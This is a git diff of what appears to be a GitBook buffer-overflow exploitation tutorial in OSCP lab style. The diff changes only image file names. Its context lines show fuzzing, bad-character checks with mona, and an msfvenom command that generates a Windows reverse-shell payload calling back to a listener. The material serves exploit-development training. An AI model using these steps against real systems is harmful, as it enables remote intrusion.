@@ -47,7 +47,7 @@ Place the following into the debugger window of Immunity:
 
 Running the fuzzer:
 
-<figure><img src="../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 * <mark style="color:yellow;">We note that it crashed at 700 bytes</mark>
 
@@ -133,7 +133,7 @@ print()
 
 * Copy the string into the <mark style="color:yellow;">payload</mark> variable in <mark style="color:yellow;">exploit.py</mark>
 
-<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption></figcaption></figure>
 
 * I suggest using vim for this part as it will be easier to remove the bad chars in the coming steps
 
@@ -150,7 +150,7 @@ print()
 * Right-click on the address and follow in dump
 * We will now be able to identify the bad chars because they go out of order
 
-<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>
 
 * After 22, it should be 23 and 24!
 * This means that there are some bad chars!
@@ -286,7 +286,7 @@ Our bad chars now look like this:
 !mona compare -f C:\mona\oscp\bytearray.bin -a 017CFA30
 ```
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>
 
 We see the status of "<mark style="color:yellow;">Unmodified</mark>" this is exactly what we were chasing after!!!!!
 
@@ -350,7 +350,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.111.208 LPORT=4444 EXITFUNC=thr
 4. Go back to your exploit and run it
 5. You should have a shell
 
-<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
